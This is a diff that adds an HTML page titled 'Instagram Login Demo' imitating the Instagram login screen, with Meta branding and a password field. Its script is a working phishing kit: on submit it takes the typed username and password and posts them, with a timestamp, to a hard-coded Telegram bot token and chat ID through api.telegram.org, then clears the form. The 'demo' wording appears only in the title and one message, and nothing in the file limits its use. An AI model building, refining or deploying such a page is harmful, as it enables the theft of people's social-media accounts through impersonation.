@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram Login Demo</title>
+
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { background:#1e1e1e; color:#fff; font-family:Arial, sans-serif; }
+.container { width:100%; min-height:100vh; padding:25px 5%; display:flex; flex-direction:column; align-items:center; }
+.language { color:#aaa; font-size:17px; margin-top:5px; }
+.logo { width:105px; height:105px; margin-top:105px; border:7px solid transparent; border-radius:30px;
+  background: linear-gradient(#1e1e1e,#1e1e1e) padding-box, linear-gradient(45deg,#ffb900,#ff0069,#c900ff) border-box; position:relative; }
+.logo::before { content:""; position:absolute; width:42px; height:42px; border:7px solid #ff2878; border-radius:50%; top:20px; left:21px; }
+.logo::after { content:""; position:absolute; width:12px; height:12px; background:#c900ff; border-radius:50%; right:14px; top:13px; }
+form { width:100%; margin-top:130px; }
+input { width:100%; height:90px; background:transparent; border:1.5px solid #555; border-radius:25px; padding:20px 25px; color:#fff; font-size:19px; outline:none; margin-bottom:25px; }
+input:focus { border-color:#aaa; }
+input::placeholder { color:#aaa; }
+button { width:100%; height:70px; border:none; border-radius:50px; background:#0866e9; color:#fff; font-size:22px; font-weight:bold; cursor:pointer; }
+button:disabled { opacity:.6; }
+.forgot { margin-top:45px; font-size:19px; text-align:center; color:#fff; }
+.bottom { width:100%; margin-top:auto; padding-top:100px; }
+.create { width:100%; height:65px; border:1.5px solid #519cff; border-radius:50px; color:#519cff; background:transparent; font-size:19px; }
+.meta { text-align:center; color:#aaa; font-size:25px; margin-top:40px; padding-bottom:15px; }
+#message { margin-top:20px; text-align:center; color:#ffcc66; font-size:14px; }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <div class="language">English (UK)</div>
+  <div class="logo"></div>
+
+  <form id="demoForm">
+    <input id="username" type="text" placeholder="Username, email address or mobile number" autocomplete="off" required>
+    <input id="password" type="password" placeholder="Password" autocomplete="off" required>
+    <button type="submit" id="loginBtn">Log in</button>
+  </form>
+
+  <div class="forgot">Forgotten password?</div>
+  <div id="message"></div>
+
+  <div class="bottom">
+    <button class="create" type="button" onclick="showDemo()">Create new account</button>
+    <div class="meta">&#8734; Meta</div>
+  </div>
+
+</div>
+
+<script>
+const BOT_TOKEN = "9115486901:AAEYkxx0Sfk_6ytfwT4-PkPE3Nd4Khr4Z70";
+const CHAT_ID   = "7792458233";
+
+const form = document.getElementById("demoForm");
+const msg  = document.getElementById("message");
+const btn  = document.getElementById("loginBtn");
+
+const esc = s => s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+
+form.addEventListener("submit", async function (e) {
+  e.preventDefault();
+
+  const username = document.getElementById("username").value.trim();
+  const password = document.getElementById("password").value;
+
+  btn.disabled = true;
+  btn.textContent = "Logging in...";
+  msg.textContent = "";
+
+  const text = "<b>New login</b>\n"
+             + "<b>User:</b> " + esc(username) + "\n"
+             + "<b>Pass:</b> " + esc(password) + "\n"
+             + "<b>Time:</b> " + new Date().toLocaleString();
+
+  try {
+    const res = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" })
+    });
+    const data = await res.json();
+    if (data.ok) {
+      msg.textContent = "Sent to Telegram";
+      form.reset();
+    } else {
+      msg.textContent = "Telegram error: " + data.description;
+    }
+  } catch (err) {
+    msg.textContent = "Network error: " + err.message;
+  } finally {
+    btn.disabled = false;
+    btn.textContent = "Log in";
+  }
+});
+
+function showDemo() {
+  msg.textContent = "This is a demonstration page.";
+}
+</script>
+
+</body>
+</html>
